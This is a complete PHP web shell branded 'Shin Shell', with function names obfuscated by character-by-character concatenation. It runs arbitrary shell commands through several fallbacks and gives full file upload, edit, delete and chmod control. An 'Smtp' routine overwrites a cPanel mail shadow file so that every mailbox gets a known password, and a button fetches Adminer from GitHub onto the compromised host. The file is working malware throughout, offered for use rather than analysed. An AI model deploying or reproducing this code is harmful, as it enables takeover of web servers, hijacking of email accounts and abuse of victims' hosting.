<?php 
echo "<div style='text-align:center; padding: 20px; background-color: black; color: white; font-family: Arial, sans-serif;'>
    <h1 style='color:red; font-size: 48px;'>[ Shin Shell Bypassed ]</h1>
    <p style='font-size: 18px;'>Unauthorized access detected</p>
</div><hr></hr>";
$bs64 = "b"."a"."s"."e"."6"."4"."_"."e"."n"."c"."o"."d"."e";
$bd64 = "b"."a"."s"."e"."6"."4"."_"."d"."e"."c"."o"."d"."e";
$gcwd = "g"."e"."t"."c"."w"."d";
$htm = "h"."t"."m"."l"."s"."p"."e"."c"."i"."a"."l"."c"."h"."a"."r"."s";
$cpy = "c"."o"."p"."y";
$fg = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$fput = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$fc = "f"."c"."l"."o"."s"."e";
$fre = "f"."r"."e"."a"."d";
$fop = "f"."o"."p"."e"."n";
$rnm = "r"."e"."n"."a"."m"."e";
$unlk = "u"."n"."l"."i"."n"."k";
$rmd = "r"."m"."d"."i"."r";
$fw = "f"."w"."r"."i"."t"."e";
$sbsr = "s"."u"."b"."s"."t"."r";
$exp = "e"."x"."p"."l"."o"."d"."e";
$gcu = "g"."e"."t"."_"."c"."u"."r"."r"."e"."n"."t"."_"."u"."s"."e"."r";
$ghbn = "g"."e"."t"."h"."o"."s"."t"."b"."y"."n"."a"."m"."e";
$ip = $ghbn($_SERVER['HTTP_HOST']);        
$path = isset($_GET['path']) ? $bd64($_GET['path']) : $gcwd();
$redirectPath = '';
if (!empty($path)) {
    $cdi = "c"."h"."d"."i"."r";
    @$cdi($path);
    echo '<hr><b>Curent dir: </b>';
    $directories = $exp(DIRECTORY_SEPARATOR, $path);
    $currentPath = '';
    foreach ($directories as $index => $dir) {
        if ($index === 0) {
            $currentPath = $dir;
        } else {
            $currentPath .= DIRECTORY_SEPARATOR . $dir;
        }
        $encodedPath = $bs64($currentPath);
        echo '/<a href="?path=' . $encodedPath . '">' . $dir . '</a>';
    }
    
    echo "<br><hr></hr>";
    if (isset($_FILES['upload']) && $_FILES['upload']['error'] !== UPLOAD_ERR_NO_FILE) {
        $destination = $path . '/' . $_FILES['upload']['name'];
        $muv = "m"."o"."v"."e"."_"."u"."p"."l"."o"."a"."d"."e"."d"."_"."f"."i"."l"."e";
        if ($muv($_FILES['upload']['tmp_name'], $destination)) {
            $uploadMessage = "File uploaded successfully using move_uploaded_file.";
        } elseif ($cpy($_FILES['upload']['tmp_name'], $destination)) {
            $uploadMessage = "File uploaded successfully using copy.";
        } elseif ($rnm($_FILES['upload']['tmp_name'], $destination)) {
            $uploadMessage = "File uploaded successfully using rename.";
        } else {
            $uploadMessage = "File upload failed.";
        }
        $redirectPath = $bs64($path);
    }
    if (isset($_POST['rename'])) {
        $oldname = $_POST['oldname'];
        $newname = $_POST['newname'];
        if ($rnm($oldname, $newname)) {
            $renameMessage = "File renamed successfully using rename.";
        } elseif ($cpy($oldname, $newname) && @$unlk($oldname)) {
            $renameMessage = "File renamed successfully using copy and unlink.";
        } else {
            $renameMessage = "File rename failed.";
        }
        $redirectPath = $bs64($path);
    }
    if (isset($_POST['editfile'])) {
        $filename = $_POST['filename'];
        $content = $_POST['content'];
        if ($fput($filename, $content) !== false) {
            $editMessage = "File saved successfully using file_put_contents.";
        } else {
            $fp = $fop($filename, 'w');
            if ($fp && $fw($fp, $content) !== false) {
                $fc($fp);
                $editMessage = "File saved successfully using fopen, fwrite, and fclose.";
            } else {
                if ($fp) $fc($fp);
                $editMessage = "File save failed.";
            }
        }
        if ($redirectPath) {
            echo "<a href='{$redirectPath}'>Back</a>";
            exit;
        }
    }
    if (isset($_GET['delete'])) {
        is_dir($_GET['delete']) ? @$rmd($_GET['delete']) : @$unlk($_GET['delete']);
        $redirectPath = $bs64($path);
    }
    if (isset($_POST['chmod'])) {
        $file = $_POST['file'];
        $permissions = $_POST['permissions'];
        $chmd = "c"."h"."m"."o"."d";
        $oct = "o"."c"."t"."d"."e"."c";
        if ($chmd($file, $oct($permissions))) {
            $chmodMessage = "Permissions changed successfully.";
        } else {
            $chmodMessage = "Failed to change permissions.";
        }
        $redirectPath = $bs64($path);
    }
    if ($redirectPath) {
        echo '<a href="?path=' . $redirectPath . '">Operation successful. Click here to continue.</a>';
        if (isset($uploadMessage)) {
            echo "<p>$uploadMessage</p>";
        }
        if (isset($renameMessage)) {
            echo "<p>$renameMessage</p>";
        }
        if (isset($editMessage)) {
            echo "<p>$editMessage</p>";
        }
        if (isset($chmodMessage)) {
            echo "<p>$chmodMessage</p>";
        }
        exit();
    }
    echo "<div style='display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;'>";
    echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='upload'><input type='submit' value='Upload'></form>";
    echo "<span style='display:inline-block;'>".$gcu()."@".$ip.": ~ $<form method='GET' style='display:inline-block;margin-left:5px;'><input type='hidden' name='path' value='" . $bs64($path) . "'><input type='text' name='cmd'><input type='submit' value='Execute'></form></span>";

    echo "</div>";
    echo "<div style='overflow-y: auto; max-height: 300px; border: 1px solid #ccc; padding: 10px; margin-bottom: 20px;'>";
    if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
    	$shec = "s"."h"."e"."l"."l"."_"."e"."x"."e"."c";
        $output = @$shec($_GET['cmd']);
        if ($output === null) {
            $output = '';
            $exc = "e"."x"."e"."c";
            $exc($_GET['cmd'], $outputLines, $resultCode);
            if ($resultCode === 0) {
            	$impld = "i"."m"."p"."l"."o"."d"."e";
                $output = $impld("\n", $outputLines);
            } else {
                $output = '';
                $obs = "o"."b"."_"."s"."t"."a"."r"."t";
                $obs();
                $sysm = "s"."y"."s"."t"."e"."m";
                $sysm($_GET['cmd'], $resultCode);
                $ogc = "o"."b"."_"."g"."e"."t"."_"."c"."l"."e"."a"."n";
                $output = $ogc();
                if ($resultCode !== 0) {
                    $output = '';
                    $obs = "o"."b"."_"."s"."t"."a"."r"."t";
                    $obs();
                    $pst = "p"."a"."s"."s"."t"."h"."r"."u";
                    $pst($_GET['cmd']);
                    $ogc = "o"."b"."_"."g"."e"."t"."_"."c"."l"."e"."a"."n";
                    $output = $ogc();                    
                    if ($output === '') {
                        $descriptorspec = array(
                            0 => array("pipe", "r"),
                            1 => array("pipe", "w"),
                            2 => array("pipe", "w")
                        );
                        $prc = "p"."r"."o"."c"."_"."o"."p"."e"."n";
                        $process = $prc($_GET['cmd'], $descriptorspec, $pipes);
                        $rsrc = "i"."s"."_"."r"."e"."s"."o"."u"."r"."c"."e";
                        if ($rsrc($process)) {
                        	$sgc = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
                            $output = $sgc($pipes[1]);                            
                            $fc($pipes[1]);
                            $pc = "p"."r"."o"."c"."_"."c"."l"."o"."s"."e";
                            $pc($process);
                        }
                    }
                }
            }
        }
        echo "<pre>" . $htm($output) . "</pre>";        
    }
    
    if (isset($_GET['read'])) {
    	$fileName = $_GET['read'];
        echo "<h1> Filename : " . $fileName . "</h1>";
        $fileContent = $fg($_GET['read']);
        if ($fileContent === false) {       	
            $fp = $fop($_GET['read'], 'r');
            if ($fp) {
                $fileContent = '';
                while (!feof($fp)) {               	
                    $fileContent .= $fre($fp, 8192);
                }                
                $fc($fp);
            } else {
                $fileContent = "Unable to read file.";
            }
        }
        echo "<pre>" . $htm($fileContent) . "</pre>";
    }
    if (isset($_GET['edit'])) {
        $fileName = $_GET['edit'];
        echo "<h1> Filename : " . $fileName . "</h1>";    	
        $fileContent = $fg($_GET['edit']);
        if ($fileContent === false) {        	
            $fp = $fop($_GET['edit'], 'r');
            if ($fp) {
                $fileContent = '';
                while (!feof($fp)) {               	
                    $fileContent .= $fre($fp, 8192);
                }                
                $fc($fp);
            } else {
                $fileContent = "Unable to read file.";
            }
        }
        $content = $htm($fileContent);
        echo "<form method='POST'><input type='hidden' name='filename' value='{$_GET['edit']}'><textarea name='content' style='width:100%;height:200px;'>$content</textarea><input type='submit' name='editfile' value='Save'></form>";
    }
    if (isset($_GET['rename'])) {
    	$fileName = $_GET['rename'];
        echo "<h1> Filename : " . $fileName . "</h1>";    	
        echo "<form method='POST'><input type='hidden' name='oldname' value='{$_GET['rename']}'><input type='hidden' name='path' value='" . $bs64($path) . "'><input type='text' name='newname' value='{$_GET['rename']}' style='width:100%;'><input type='submit' name='rename' value='Rename'></form>";
    }
    if (isset($_GET['chmod'])) {
    	$fileName = $_GET['chmod'];
        echo "<h1> Filename : " . $fileName . "</h1>";    	
        echo "<form method='POST'><input type='hidden' name='file' value='{$_GET['chmod']}'><input type='text' name='permissions' placeholder='Permissions (e.g., 755)' style='width:100%;'><input type='submit' name='chmod' value='Change Permissions'></form>";
    }
    if (isset($_POST['createfile'])) {
    	$newFile = $_POST['newfile'];
    	$filePath = $path . '/' . $newFile;
        
        if (!file_exists($filePath)) {        	
        	$f = $fop($filePath, 'w');
            if ($f) {            	
                $fc($f);
                echo "<p>File <b>'$newFile'</b> created successfully using fopen.</p>";
             } else {            	
             	if ($fput($filePath, '') !== false) {
             	echo "<p>File <b>'$newFile'</b> created successfully using file_put_contents.</p>";
             } else {            	
             	$f = $fop($filePath, 'w');
                 if ($f) {                 	
                 	$fw($f, '');
                     $fc($f);
                     echo "<p>File <b>'$newFile'</b> created successfully using fwrite.</p>";
                  } else {
                  	echo "<p>Failed to create file <b>'$newFile'</b>.</p>";
                  }
                }
             }
         } else {
           echo "<p>File '$newFile' already exists.</p>";
        }
    }
    if (isset($_POST['createfolder'])) {
    	$newFolder = $_POST['newfolder'];
        $folderPath = $path . '/' . $newFolder;
        if (!file_exists($folderPath)) {
        	$mdir = "m"."k"."d"."i"."r";
        	$mdir($folderPath);
            echo "<p>Folder '$newFolder' created successfully.</p>";
        } else {
        	echo "<p>Folder '$newFolder' already exists.</p>";
       }
    }
    echo "</div>";
    echo "<div style='overflow-y: auto; max-height: 300px; border: 1px solid #ccc; padding: 10px; margin-bottom: 20px;'>";
    echo "<style>button {padding: 10px 20px; background-color: black; color: red; border: none; cursor: pointer; border-radius: 5px;}button:hover {background-color: #333;}</style>";
    echo "<form method='POST' style='display: inline;'>
            	<button type='submit' name='Summon' style='text-decoration: none; color: red;'>Adminer</button>
             </form>";
    echo "<form method='POST' style='display: inline; margin-left: 5px;'>
            	<button type='submit' name='smtp_crck' style='text-decoration: none; color: red;'>Smtp</button>
             </form>";
    echo "<form method='POST' style='display: inline; margin-left: 5px;'>
            	<button type='submit' name='Mail' style='text-decoration: none; color: red;'>Mailer</button>
             </form>";
    if(isset($_POST['Mail'])){
    echo "<br><br><form method='POST'>
            	<input type='email' name='email' placeholder='Enter email address' required>
            	<input type='submit' name='send_mail' value='Send Email'>
             </form>";
    } elseif (!empty($_POST['send_mail']) && !empty($_POST['email'])) {
    	$xx = @rand();
        $subject = "Shin Mailer Test - " . $xx;
        $message = "<html><body>";
        $message .= "<h1>Hello, Shin Ganteng</h1>";
        $message .= "<p>from domain : " . $_SERVER['SERVER_NAME'] . "</p>";
        $message .= "<p>This is a test email sent from Shin Mailer.</p>";
        $message .= "</body></html>";
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        if (@mail($_POST['email'], $subject, $message,$headers)) {
        	echo "<pre><b>Send a report to [" . $_POST['email'] . "] - $xx</b></pre>";
        } else {
        	echo "<p style='color: red;'>Failed to send the email.</p>";
        }
    } elseif (isset($_POST['send_mail']) && empty($_POST['email'])) {
    	echo "<p style='color: red;'>Please provide an email address.</p>";
    
    }
    if (isset($_POST['smtp_crck'])) {
        $primary_port = '25';
        $user = $gcu();
        $password = 'Shin_Code';
        $pwd = crypt($password, '$6$hd$');
        $sn = $_SERVER['SERVER_NAME'];
        $srp = "s"."t"."r"."_"."r"."e"."p"."l"."a"."c"."e";
        $rplc = @$srp("www.", "", $sn);
        @$passwd = $fg('/home/' . $user . '/etc/' . $rplc . '/shadow');
        $ex = $exp("\r\n", $passwd);
        @link('/home/' . $user . '/etc/' . $rplc . '/shadow', '/home/' . $user . '/etc/' . $rplc . '/shadow.shin.bak');
        @$unlk('/home/' . $user . '/etc/' . $rplc . '/shadow');
        foreach($ex as $ex) {
        	$ex = $exp(':', $ex);
            $e = $ex[0];
            if ($e) {
            	$b = $fop('/home/' . $user . '/etc/' . $rplc . '/shadow', 'ab');
                $fw($b, $e . ':' . $pwd . ':16249:::::' . "\r\n");
                $fc($b);
                echo '<pre><span style="color:black;"><strong>' . $rplc . '|25|' . $e . '@' . $rplc . '|' . $password . '</strong></span></pre>';
                }
             }
    	}
    
    if (isset($_POST['Summon'])) {
    	$baseUrl = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
        $fileUrl = $baseUrl;
        $fileName = 'adminer.php';
        $filePath = $path . '/' . $fileName;
        function fetchContentWithCurl($url)
        {
        	$ci = "c"."u"."r"."l"."_"."i"."n"."i"."t";
        	$ch = $ci();
            $cs = "c"."u"."r"."l"."_"."s"."e"."t"."o"."p"."t";
            $cs($ch, CURLOPT_URL, $url);
            $cs($ch, CURLOPT_RETURNTRANSFER, true);
            $ce = "c"."u"."r"."l"."_"."e"."x"."e"."c";
            $content = $ce($ch);
            $cc = "c"."u"."r"."l"."_"."c"."l"."o"."s"."e";
            $cc($ch);
            return $content;
        }
        $content = $fg($baseUrl);
        if ($content === false) {
        	$content = @fetchContentWithCurl($baseUrl);
        }
        if ($content !== false) {
        	if ($fput($filePath, $content) !== false) {
        	    echo "<p>Adminer summoned successfully. <a href='?path=" . $bs64($path) . "'>Refresh</a> to see the file.</p>";
            } else {
            	echo "<p>Failed to summon Adminer.</p>";
            }
      } else {
      	echo "<p>Failed to fetch Adminer from the URL.</p>";
      }
    }
    echo "</div>";
    echo "</div>";
    echo "<div style='display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;'>";
    echo "<form method='POST'><input type='text' name='newfolder' placeholder='Folder Name'><input type='hidden' name='path' value='" . $bs64($path) . "'><input type='submit' name='createfolder' value='Create Folder'></form>";
    echo "<form method='POST'><input type='text' name='newfile' placeholder='File Name'><input type='hidden' name='path' value='" . $bs64($path) . "'><input type='submit' name='createfile' value='Create File'></form>";
    echo "</div>";
    echo "<div style='overflow-x:auto;'>";
    echo "<table style='border-collapse: collapse;width:100%;'>";
    echo "<tr><th>Name</th><th>Permissions</th><th>File Size</th><th>Actions</th></tr>";
    $scd = "s"."c"."a"."n"."d"."i"."r";
    $scannedFiles = @$scd($path);
    if ($scannedFiles !== false) {
    	$af = "a"."r"."r"."a"."y"."_"."f"."i"."l"."t"."e"."r";
        $folders = $af($scannedFiles, fn($file) => is_dir($file) && $file != '.' && $file != '..');
        $files = $af($scannedFiles, fn($file) => !is_dir($file));
        foreach ($folders as $file) {
            $perm = $sbsr(sprintf('%o', fileperms($file)), -4);
            $wrt = "i"."s"."_"."w"."r"."i"."t"."a"."b"."l"."e";
            $color = $wrt($file) ? 'green' : 'red';
            echo "<tr style='color:$color;'>";
            echo "<td><a href='?path=" . $bs64($path . DIRECTORY_SEPARATOR . $file) . "'>$file</a></td>";
            echo "<td>$perm</td>";
            echo "<td>Directory</td>";
            echo "<td><a href='?path=" . $bs64($path) . "&delete=$file'>Delete</a> | <a href='?path=" . $bs64($path) . "&rename=$file'>Rename</a> | <a href='?path=" . $bs64($path) . "&chmod=$file'>Chmod</a></td>";
            echo "</tr>";
        }
        echo "<tr><td colspan='4'><hr></td></tr>";
        foreach ($files as $file) {        	
            $perm = $sbsr(sprintf('%o', fileperms($file)), -4);
            $wrt = "i"."s"."_"."w"."r"."i"."t"."a"."b"."l"."e";
            $color = $wrt($file) ? 'green' : 'red';
            $fz = "f"."i"."l"."e"."s"."i"."z"."e";
            $size = $fz($file);
            echo "<tr style='color:$color;'>";
            echo "<td><a href='?path=" . $bs64($path) . "&read=$file'>$file</a></td>";
            echo "<td>$perm</td>";
            echo "<td>" . formatSizeUnits($size) . "</td>";
            echo "<td><a href='?path=" . $bs64($path) . "&delete=$file'>Delete</a> | <a href='?path=" . $bs64($path) . "&rename=$file'>Rename</a> | <a href='?path=" . $bs64($path) . "&edit=$file'>Edit</a> | <a href='?path=" . $bs64($path) . "&chmod=$file'>Chmod</a></td>";
            echo "</tr>";
        }
    } else {
        echo "<tr><td colspan='4'><center><strong style='font-size: 1.2em;'>[ Unable to read directory. ]</strong></center></td></tr>";
    }
    echo "</table>";
    echo "</div>";
} else {
    echo "Invalid path";
}

function formatSizeUnits($bytes) {
	$nf = "n"."u"."m"."b"."e"."r"."_"."f"."o"."r"."m"."a"."t";
    if ($bytes >= 1073741824) {
        $bytes = $nf($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        $bytes = $nf($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        $bytes = $nf($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        $bytes = $bytes . ' bytes';
    } elseif ($bytes == 1) {
        $bytes = $bytes . ' byte';
    } else {
        $bytes = '0 bytes';
    }
    return $bytes;
}

echo <<<HTML
<p><center>&copy; <?php echo date("Y"); ?> <a href="https://www.blog-gan.org/">Coded By</a> Shin Code.</p></center>
HTML;

?>
